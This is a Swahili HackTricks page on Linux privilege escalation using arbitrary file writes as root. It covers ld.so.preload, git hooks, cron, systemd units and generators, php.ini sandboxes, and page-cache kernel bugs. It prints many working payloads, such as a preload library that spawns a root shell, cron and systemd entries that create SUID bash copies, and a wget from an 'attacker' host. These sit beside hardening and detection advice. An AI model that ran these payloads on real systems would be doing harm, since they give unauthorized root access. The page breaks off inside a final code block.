# Uandishi wa Faili Holela kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ni orodha ya mfumo mzima ya shared objects ambazo dynamic linker hupakia kabla ya shared objects nyingine. Secure-execution mode huweka vizuizi vya ziada kwenye preloading, kwa hivyo njia ya maktaba kama `/tmp/pe.so` si mbinu ya jumla kwa SUID-binary.\
Ukiweza kuunda au kurekebisha faili hii, mchakato unaopakia faili hiyo utapakia maktaba iliyoorodheshwa kabla ya shared objects zake nyingine, na hivyo kuruhusu utekelezaji wa msimbo katika muktadha wa mchakato huo.<sup>[[12]](#references)</sup>

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** ni script zinazoweza kutekelezwa kwa matukio katika hifadhi, yakiwemo shughuli za commit na merge. Ikiwa **script au mtumiaji mwenye mapendeleo ya juu** atatekeleza shughuli hizo na mshambulizi anaweza **kuandika katika folda ya `.git`**, hook inaweza kutumiwa kwa **kuongeza mapendeleo**.<sup>[[13]](#references)</sup>

Kwa mfano, inawezekana **kutengeneza script** katika repo ya git ndani ya **`.git/hooks`** ili itekelezwe kila mara commit mpya inapoundwa:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Git tree export Path traversal yenye haki za juu

Kisawazishaji chenye haki za juu kinaweza kuepuka checkout na badala yake kuorodhesha repository inayoathiriwa na mshambuliaji kwa kutumia `git ls-tree`, kusoma kila blob kwa `git cat-file`, kuunganisha pathname iliyoripotiwa na staging directory, kisha kuiandika chenyewe. Hii husababisha **arbitrary file write kwa kutumia haki za kisawazishaji** kinapochanganya `-c safe.directory=*` (inayozima ulinzi wa Git dhidi ya repository inayomilikiwa na mtumiaji mwingine) na kutokuwepo kwa ukaguzi wa kuhakikisha destination iko ndani ya directory iliyokusudiwa. Jina la ingizo la tree lililo absolute husababisha Python's `os.path.join(stage, name)` kuacha `stage`; jina la relative lenye `../` hutoroka wakati filesystem inapolitatua. Kwa kuwa programu huandika tree ghafi badala ya kuiomba Git ifanye checkout, ukataliwaji wa pathname wakati wa checkout hauilindi sehemu inayopokea faili.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Tafuta muundo huu wa code katika root services, timers, deployment agents, template importers na backup/restore jobs:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Kipengee cha tree husimbwa kama `<mode> SP <name> NUL <raw object ID>`. Chaguo la `git hash-object --literally` huruhusu kimakusudi data ya object ambayo uchanganuzi wa kawaida au `git fsck` inaweza kukataa, hivyo clone ya muda inaweza kuunda tree yenye jina la faili ambalo ni njia kamili ya lengwa. Mfano huu huunda blob ya faili ya cron, hufunga tree iliyoundwa kwa hila ndani ya commit, kisha huhamisha branch kuielekeza hapo; unyonyaji bado unahitaji ruhusa ya kusasisha repository inayotumiwa na job yenye upendeleo wa juu na seva ya Git inayokubali object iliyoharibika.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Uimarishaji lazima ujumuishe upokeaji wa repository na operesheni ya mwisho ya mfumo wa faili:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Badilisha `safe.directory=*` na repository halisi ambazo huduma inapaswa kuziamini, na inapowezekana uchakataji wa repository uendeshwe bila marupurupu ya root.
- Kataa majina kamili (absolute) na kipengele chochote cha `.` au `..` kabla ya kuunda vitu kwenye mfumo wa faili. Baada ya kuunganisha njia, badilisha iwe ya kanoni na uhakikishe kuwa lengwa linabaki ndani ya root iliyokusudiwa.
- Epuka mashindano ya symlink ya kagua-kisha-fungua: fungua ukitumia file descriptor ya saraka inayoaminika na, kwenye Linux, tumia `openat2()` yenye `RESOLVE_BENEATH` pamoja na `RESOLVE_NO_SYMLINKS` kwa njia zinazodhibitiwa na mshambuliaji.
- Pendelea checkout ya kawaida kwenye saraka iliyotengwa badala ya kutekeleza upya checkout kutoka kwenye matokeo ya plumbing. Ikiwa upokeaji wa raw-object unahitajika, washa uthibitishaji wa upande wa receive kama `receive.fsckObjects=true`; usipunguze ukali wa matokeo ya `receive.fsck.*` yanayohusu majina ya njia na yanayohitajika kukataa miti iliyoundwa kwa makusudi.

### Usambazaji wa usanidi wenye marupurupu ya juu

Baadhi ya huduma za usimamizi huhifadhi hali ya mfumo inayokusudiwa kwenye faili ya usanidi na baadaye huisambaza zikiwa na marupurupu ya juu. Kwa mfano, [openmediavault huhifadhi usanidi kwenye `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), na [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) yake inaweza kutumia mabadiliko ya huduma. Ikiwa akaunti yenye marupurupu ya chini inaweza kuandika au kubadilisha faili hiyo, kagua ikiwa pia inaweza kuomba usambazaji ulioidhinishwa na ikiwa moduli iliyochaguliwa hutumia sehemu iliyobadilishwa ikiwa root. Vifunguo vya akaunti za SSH, amri zilizopangwa, na usakinishaji wa vifurushi vina masharti tofauti; kuwepo tu kwa faili au faili ya XML inayoweza kuandikwa hakuthibitishi lolote kati ya hayo. Kagua ruhusa za faili na za saraka mama, vikundi vya mpigaji na idhini ya RPC, toleo lililosakinishwa, na sehemu inayotumia usanidi huo, bila kuhariri usanidi au kuanzisha operesheni ya kutumia mabadiliko wakati wa uorodheshaji.

Ufafanuzi wa vitendo wa Fail2Ban chini ya `/etc/fail2ban/action.d/` ni mpaka mwingine wa usanidi wenye marupurupu ya juu. Mtumiaji anayeweza kuandika kwenye saraka hiyo na kuitafuta anaweza kubadilisha ufafanuzi wa kitendo au kuongeza override, lakini ruhusa za saraka pekee hazithibitishi utekelezaji wa msimbo. Thibitisha kuwa jail iliyowashwa kweli huchagua kitendo kilichoathiriwa, kuwa huduma ya Fail2Ban hukitekeleza ikiwa na marupurupu ya juu, na kuwa reload/restart iliyoidhinishwa pamoja na tukio linalolingana la ban litatokea. Ruhusa isiyohusiana ya sudo ya kuanzisha upya Fail2Ban ina umuhimu tu ikiwa inahusu mwito halisi wa huduma na ufafanuzi uliobadilishwa unapakiwa. [Usanidi wa vitendo wa Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) unaeleza uhusiano kati ya saraka ya vitendo na jail; [kitendo chake cha mfano](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) kinaonyesha kuwa `actionban` huendeshwa wakati wa ban kwa kutumia haki za mtumiaji wa huduma. Kagua ruhusa na usanidi unaotumika bila kubadilisha vitendo au kuchochea bans wakati wa uorodheshaji.

Mpaka tofauti hujitokeza pale jail ya Fail2Ban iliyowashwa inapotumia kitendo cha barua pepe kinachotumia taarifa za WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) ilihusisha maandishi yasiyoaminika ya WHOIS yaliyopitishwa kwa GNU mailutils `mail`, ambayo uchakataji wake wa escape ungeweza kuendesha amri. Mwandishi wa faili mwenye marupurupu ya chini anaweza kuathiri jibu ikiwa anaweza kubadilisha usanidi wa kubainisha seva wa **mteja wa WHOIS aliyechaguliwa**; [whois.conf(5) ya Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) inaeleza faili mojawapo ya aina hiyo, lakini njia yake na matumizi yake hutofautiana kulingana na usakinishaji. Kagua jail/kitendo kinachotumika, utambulisho wa huduma, mteja halisi wa WHOIS na njia ya usanidi wake, utekelezaji wa mail, uwezo wa kudhibiti jibu, na marekebisho ya vendor au backport iliyosakinishwa. Faili ya usanidi wa WHOIS inayoweza kuandikwa, toleo la Fail2Ban, au kitendo cha mail pekee havithibitishi mnyororo huu; epuka kuuliza seva ya nje au kuchochea bans wakati wa uorodheshaji tulivu.

### Uundaji wa faili kwa TFTP na hooks za vifurushi vyenye marupurupu ya juu

Huduma ya TFTP inayofikika inaweza kuvuka mpaka wa container au wa mtumiaji wa ndani ikiwa mipangilio **inayotumika** ya tftpd-hpa huiendesha kama root, huweka root ya mfumo wa faili kuwa saraka ya `--secure`, na kuwasha `--create`. [Mwongozo wa tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) unaeleza chaguo za uundaji na mtumiaji. Hii inaweza kuruhusu kuunda faili mpya kwenye saraka ya usanidi yenye marupurupu ya juu, ikiwemo `/etc/apt/apt.conf.d/`; faili iliyopo inaweza bado kuzuia kubadilishwa. [Mwongozo wa usanidi wa APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) unaeleza amri za `APT::Update::Pre-Invoke`. `apt update` inayoendeshwa na root inaweza kuwa mtumiaji mwenye marupurupu ya juu **ikiwa tu** itasoma faili mpya ya usanidi. Thibitisha hoja halisi za daemon inayoendesha na utambulisho wake, ufikikaji wa mtandao na uchujaji wake, sera ya uundaji wa faili kwenye saraka lengwa, upeo halisi wa usanidi wa APT, na mwito wa baadaye wenye marupurupu ya juu. Faili ya chaguomsingi, saraka lengwa inayoweza kuandikiwa, au amri ya APT iliyopangwa pekee havithibitishi njia nzima. Uchunguzi wa awali unapaswa kusoma tu usanidi na metadata ya ndani yenye ukubwa uliowekewa kikomo, bila kupakia faili au kuendesha APT.

### Faili za Cron na muda

Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root huendesha**, kwa kawaida unaweza kupata utekelezaji wa msimbo wakati kazi hiyo itakapoendeshwa tena. Malengo ya kuvutia ni pamoja na:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- crontab ya root yenyewe ndani ya `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- timers za `systemd` na huduma zinazoanzishwa nazo

Ukaguzi wa haraka:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Njia za kawaida za kutumia vibaya:

- **Ongeza root cron job mpya** kwenye `/etc/crontab` au faili katika `/etc/cron.d/`
- **Badilisha script** ambayo tayari inaendeshwa na `run-parts`
- **Weka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary inayoizindua

Mfano mdogo wa cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` kwa kawaida hupuuza majina ya faili yenye nukta, kwa hivyo pendelea majina kama `backup` badala ya `backup.sh`.<sup>[[15]](#references)</sup>
- Baadhi ya mifumo hutumia timers za `systemd` badala ya cron ya kawaida, lakini wazo la kuitumia vibaya ni lilelile: **rekebisha kitu ambacho root itatekeleza baadaye**.<sup>[[20]](#references)</sup>

### Faili za Service na Socket

Ikiwa unaweza kuandika **faili za unit za `systemd`** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kupakia upya na kuwasha upya unit, au kwa kusubiri njia ya kuwasha service/socket ianzishe.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Pia kagua ruhusa za kuandika na kutafuta katika saraka ya unit za mfumo yenyewe, ikijumuisha ACL: mtumiaji anaweza kuunda unit mpya ndani ya `/etc/systemd/system` hata kama amezuiwa kusoma au kuorodhesha saraka hiyo. Njia hiyo pekee haianzishi chochote. Thibitisha kuwa system manager itapakia unit mpya, kuwa mtumiaji anayetekeleza ana ruhusa inayoweza kutumia root ya `systemctl start` au `restart` kwa jina lake (au njia nyingine ya kuwasha yenye upendeleo), na kuwa service inaendeshwa kwa utambulisho unaokusudiwa. Unit iliyopo ambayo imebadilishwa kwenye diski inaweza kuhitaji `daemon-reload`; unit yenye jina jipya huwa na tabia tofauti ya kupakiwa. Kagua hoja halisi za sudo na vizuizi kabla ya kudhani kuwa kanuni ya kuwasha upya yenye wildcard inatosha. Tazama [njia ya utafutaji wa unit za systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) na [semantiki za upakiaji na upakiaji upya wa systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Malengo ya kuvutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides za Drop-in ndani ya `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binaries za service zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Njia za `EnvironmentFile=` zinazoweza kuandikwa na kupakiwa na service ya root

Ukaguzi wa haraka:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Njia za kawaida za matumizi mabaya:

- **Kubadilisha `ExecStart=`** katika service unit inayomilikiwa na root unayoweza kuhariri
- **Kuongeza drop-in override** yenye `ExecStart=` hasidi na kufuta ile ya zamani kwanza
- **Kuweka Backdoor kwenye script/binary** ambayo unit tayari inarejelea
- **Kutekeleza Hijack ya socket-activated service** kwa kurekebisha faili ya `.service` inayolingana, ambayo huanza socket inapopokea muunganisho

Mfano wa override hasidi:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Mtiririko wa kawaida wa uanzishaji:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Ikiwa huwezi kuwasha upya services mwenyewe lakini unaweza kuhariri unit iliyoanzishwa na socket, huenda ukahitaji tu **kusubiri muunganisho wa client** ili kuanzisha utekelezaji wa service iliyoingiliwa kama root.<sup>[[17]](#references)</sup>

### Saraka za systemd generator

**System generators** ni executables zinazoanzishwa na system manager kabla haijapakia unit files, wakati wa boot na wakati wa kupakia upya usanidi. Kwa hiyo, ruhusa ya kuandika kwenye saraka ya system-generator (au kwenye generator executable iliyopo) ni njia ya moja kwa moja ya kutekeleza code kama root, ambayo ni rahisi kukosa wakati ukaguzi unapoangalia faili za `*.service` na `*.timer` pekee.<sup>[[35]](#references)[[36]](#references)</sup>

Mpangilio wa kawaida wa kutafuta ni `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, na `/usr/lib/systemd/system-generators/` (baadhi ya distributions huonyesha `/lib/systemd/system-generators/` kupitia muunganiko wa `/usr`). Executable yenye jina lilelile kwenye saraka ya mapema hufunika ile iliyo kwenye saraka za baadaye. Usichanganye **saraka za executable za input** hizi na `/run/systemd/generator`, `/run/systemd/generator.early`, na `/run/systemd/generator.late`, ambazo zina matokeo ya unit ya muda yanayotengenezwa na generators.<sup>[[35]](#references)</sup>

Ukaguzi wa haraka:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Generator iliyoundwa upya lazima iwekwe alama ya executable. Ikiwa write primitive inadhibiti baiti lakini si mode, lenga generator ambayo tayari ni executable; kuifuta yaliyomo mahali pake kwa kawaida huhifadhi metadata yake. Ikiwa saraka yenyewe inaweza kuandikiwa, unda ingizo jipya na uliweke alama ya executable.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Kutekeleza `systemctl daemon-reload` dhidi ya manager ya **system** kunahitaji uidhinishaji unaofaa, lakini huendesha upya kila system generator; vinginevyo, subiri reload yenye ruhusa za juu, operesheni ya kifurushi, au kuwasha upya. Saraka za user-generator kama `~/.config/systemd/user-generators/` huendeshwa chini ya user manager na zenyewe **hazitoi root**.<sup>[[35]](#references)</sup>

Kwa hardening na hunting, hakiki kila kipengele cha path na ACL badala ya kuangalia biti za ruhusa za mwisho tu; weka baseline ya hashes/umiliki wa vifurushi kwa generators; na toa tahadhari kuhusu mabadiliko ya uundaji, kubadilisha jina, maudhui au ruhusa katika saraka zote za ingizo za system-generator. Kufuatilia uandishi ni muhimu kwa sababu generator ya one-shot inaweza kujifuta baada ya kutekelezwa, ilhali mti wa unit uliotengenezwa chini ya `/run/systemd/generator*` hujengwa upya kwenye reload inayofuata.<sup>[[35]](#references)[[36]](#references)</sup>

### Andika juu ya `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye ruhusa za juu

Baadhi ya daemon maalum hukagua PHP inayotolewa na mtumiaji kwa kuendesha `php` yenye **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo ndani ya sandbox bado ina **primitive yoyote ya uandishi** (kama `file_put_contents`) na unaweza kufikia **path halisi ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika juu ya config hiyo** ili kuondoa vizuizi, kisha utume payload ya pili itakayotekelezwa ikiwa na ruhusa za juu.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida:

1. Payload ya kwanza huandika juu ya config ya sandbox.
2. Payload ya pili hutekeleza code baada ya functions hatari kuwezeshwa tena.

Mfano mdogo (badilisha path itumiwayo na daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), utekelezaji wa pili hutoa muktadha wa root. Hii kimsingi ni **privilege escalation via config overwrite** wakati runtime iliyowekewa sandbox bado inaweza kuandika faili.

### binfmt_misc

`binfmt_misc` huonyesha registrations chini ya `/proc/sys/fs/binfmt_misc`; kila registration huhusisha muundo wa aina ya faili na interpreter. Athari kwa privileges hutegemea ni nani anayeweza kubadilisha registration na ni process gani baadaye hutekeleza faili inayolingana, kwa hivyo hakikisha masharti hayo kabla ya kuichukulia kama njia ya privilege escalation.<sup>[[21]](#references)</sup>

Helper inayoweza kutekelezwa yenye `CAP_DAC_OVERRIDE` inaweza kutoa njia tofauti ya registration ikiwa inapokea data inayodhibitiwa na caller na kuiandika kwa `/proc/sys/fs/binfmt_misc/register`, hata kama caller hawezi kuandika node hiyo moja kwa moja. Kagua ingizo na tabia ya uandishi ya helper bila kuiendesha wakati wa enumeration. Ikiwa rule iliyosajiliwa inatumia flag ya `C`, interpreter hupokea credentials kulingana na binary iliyolingana; kwa hiyo, faili ya SUID inayomilikiwa na root inaweza kuendesha interpreter inayodhibitiwa na caller kama root. Thibitisha mount ya `binfmt_misc` na policy ya registration, capability inayotumika ya helper, rule halisi na path ya interpreter, target ya SUID inayoweza kutekelezwa, na kama `no_new_privs` au mount ya `nosuid` inazuia mabadiliko ya SUID. Bit ya capability au string ya path iliyopachikwa pekee ni dokezo la ukaguzi tu.<sup>[[21]](#references)</sup> Tazama [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) kwa masharti yanayozuia SUID.

### Overwrite schema handlers (kama http: au https:)

Mazingira ya desktop hutumia MIME associations na desktop entries kuchagua programu ya kutumia kwa URI schemes; mshambulizi anayeweza kuandika directories husika za per-user configuration na desktop-entry anaweza kuelekeza schemes hizo kwenye launcher anayoidhibiti. Kwa kurekebisha faili ya `$HOME/.config/mimeapps.list` ili ielekeze HTTP na HTTPS URL handlers kwenye faili hasidi (kwa mfano, `x-scheme-handler/http=evil.desktop` na `x-scheme-handler/https=evil.desktop`), kubofya kwa mtumiaji kunaweza kuanzisha desktop entry hiyo.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root ikiendesha scripts/binaries zinazoweza kuandikwa na mtumiaji

Ikiwa workflow yenye mapendeleo inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na mtumiaji asiye na mapendeleo), unaweza kuiteka:<sup>[[1]](#references)</sup>

- **Gundua uendeshaji:** fuatilia michakato kwa kutumia pspy ili kubaini root ikiendesha paths zinazodhibitiwa na mtumiaji.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Thibitisha uwezo wa kuandika:** hakikisha kuwa faili lengwa na saraka yake vinamilikiwa na mtumiaji wako na unaweza kuviandikia.
- **Tekeleza utekaji wa lengo:** hifadhi nakala ya binary/script asilia, kisha weka payload inayounda SUID shell (au kutekeleza kitendo kingine chochote cha root), halafu rejesha ruhusa:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Tekeleza kitendo chenye ruhusa za juu** (kwa mfano, kubonyeza kitufe cha UI kinachoanzisha helper). Root ikitekeleza tena path iliyotekwa, pata shell yenye ruhusa zilizopandishwa kwa `./rootshell -p`.

### Marekebisho ya faili ya page-cache pekee ya binary zenye ruhusa za juu

Baadhi ya kernel bugs hazibadilishi faili **kwenye diski**. Badala yake, hukuwezesha kurekebisha **nakala ya page cache pekee** ya faili inayoweza kusomwa. Ikiwa unaweza kulenga binary ya **setuid** au inayotekelezwa na **root** kwa njia nyingine, utekelezaji unaofuata unaweza kuendesha bytes zinazodhibitiwa na mshambuliaji kutoka kwenye kumbukumbu na kupandisha ruhusa, ingawa hash ya faili kwenye diski haijabadilika.<sup>[[3]](#references)[[4]](#references)</sup>

Ni muhimu kufikiria hili kama **primitive ya kuandika faili wakati wa utekelezaji pekee**:<sup>[[3]](#references)</sup>

- **Diski hubaki safi**: inode na bytes zilizo kwenye diski hazibadiliki
- **Kumbukumbu huwa na mabadiliko**: michakato inayosoma/kuendesha ukurasa uliohifadhiwa kwenye cache hupata maudhui yaliyorekebishwa na mshambuliaji
- **Athari ni ya muda**: mabadiliko hupotea baada ya kuwasha upya au ukurasa kuondolewa kwenye cache

Primitive hii iko kati ya **kuandika faili kiholela** kwa kawaida na bugs za zamani za **unyanyasaji wa page-cache** kama Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na vikwazo vya nafasi ya kuandika
- Primitive ya page-cache pekee inaweza kuwa ya kuaminika zaidi ikiwa njia yenye hitilafu inaruhusu kuandika moja kwa moja kwenye kurasa za faili zilizo kwenye cache

#### Mtiririko wa jumla wa privesc

1. Pata primitive ya kernel inayoweza kuandika kwenye **kurasa za page cache zinazoungwa mkono na faili**
2. Itumie dhidi ya **binary yenye ruhusa za juu inayoweza kusomwa** au faili nyingine inayotekelezwa na root
3. Anzisha utekelezaji **kabla** ukurasa haujaondolewa kwenye cache
4. Pata utekelezaji wa msimbo kama root huku faili iliyo kwenye diski bado ikionekana kuwa haijabadilishwa

Malengo ya kawaida yenye thamani kubwa:

- Binary za **setuid-root**
- Helpers zinazoanzishwa na **huduma za root**
- Binary zinazoendeshwa mara nyingi kutoka kwenye **containers zinazoshiriki kernel/page cache ya host**

#### Njia ya mfano ya AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ni mfano mzuri wa aina hii. Njia yenye hitilafu ilikuwa kwenye API ya Linux crypto ya userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` inaweza kuhamisha marejeleo ya kurasa za page cache kutoka kwenye faili inayoweza kusomwa hadi kwenye scatterlist ya crypto TX
- njia ya kusimbua ya `algif_aead` inayofanyika mahali pale pale ilitumia tena buffer za chanzo na lengwa
- kisha `authencesn` iliandika kwenye eneo la tag la lengwa
- eneo hilo lilipokuwa bado linarejelea kurasa za faili zilizowekwa kwenye cache, maandishi yalifika kwenye **page cache ya faili lengwa**

Kwa hiyo mbinu ya kuvutia si CVE yenyewe, bali muundo huu:

- **pitisha kurasa za cache zinazoungwa mkono na faili kwenye subsystem ya kernel**
- ifanye subsystem izichukulie kama matokeo yanayoweza kuandikwa
- anzisha overwrite ndogo inayodhibitiwa kwenye kumbukumbu

PoC ya umma ilitumia **maandishi ya baiti 4** yaliyofanywa mara kwa mara kurekebisha `/usr/bin/su` kwenye kumbukumbu, kisha ikaitekeleza.<sup>[[4]](#references)[[7]](#references)</sup>

#### Njia ya mfano ya ESP / XFRM + netfilter TEE clone

DirtyClone (CVE-2026-43503) inaonyesha aina nyingine ya muundo huo wa **kuandika-kwa-root kupitia page-cache pekee**, lakini safari hii sehemu inayopokea data ni **usimbuaji wa IPsec ESP** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Mbinu muhimu ni hatua ya **kuficha asili ya metadata**:

- `splice()` huweka **ukurasa wa page cache unaoungwa mkono na faili ya kusoma pekee** ndani ya pakiti ya ESP-in-UDP
- kinga ya awali ya DirtyFrag iliweka alama ya `SKBFL_SHARED_FRAG` kwenye skb hiyo ili `esp_input()` **inukuu kabla ya kusimbua**
- netfilter `TEE` hurudufisha pakiti kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone huhifadhi **rejeleo lilelile la ukurasa halisi wa page cache** lakini hupoteza `SKBFL_SHARED_FRAG`
- kisha `esp_input()` huchukulia clone kuwa salama na kutekeleza usimbuaji wa **`cbc(aes)` mahali pale pale** kwenye ukurasa unaoungwa mkono na faili

Somo kwa wakaguzi ni pana zaidi ya CVE hii: ikiwa kinga inategemea **metadata ya skb/ukurasa** kuamua kama operesheni lazima inakili kwanza, njia yoyote ya **clone/nakili inayohifadhi ukurasa msingi lakini kuondoa metadata** inaweza kufungua tena primitive ya kuandika bila kuonekana.

Mtiririko wa kawaida wa unyonyaji:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya network namespace ya faragha**
2. washa loopback na usakinishe kanuni ya **netfilter `TEE`** kwenye `mangle/OUTPUT`
3. sakinisha XFRM ESP transport SA kupitia `NETLINK_XFRM`
4. encode kila neno lengwa la baiti 4 kwenye sehemu ya SA `seq_hi` (mbinu ya DirtyFrag ya kuchagua neno)
5. tuma pakiti ya ESP-in-UDP iliyowekwa kwa `splice()` ili **clone ya TEE** ifike `esp_input()` na isimbue **mahali pale pale**
6. rudia hadi nakala ya page cache ya `/usr/bin/su` au executable nyingine yenye ruhusa za juu iwe na msimbo unaodhibitiwa na mshambuliaji

Kiutendaji, athari ni sawa na mfano wa `AF_ALG`: faili iliyo kwenye diski hubaki safi, lakini `execve()` hutumia **bytes zilizobadilishwa za page cache** na kutoa root.<sup>[[8]](#references)[[9]](#references)</sup>

Ukaguzi muhimu wa kubaini uwezekano wa kuathiriwa na aina hii:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Upunguzaji wa attack surface wa muda mfupi pia hutegemea njia hapa: kusasisha hadi kernel yenye `48f6a5356a33` hurekebisha njia ya clone, huku kuzuia upakiaji wa `xt_TEE` kiotomatiki kukiondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Kukabiliwa na hatari na utafutaji

Ukishuku aina hii ya hitilafu, usitegemee tu ukaguzi wa uadilifu wa diski. Pia hakikisha:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
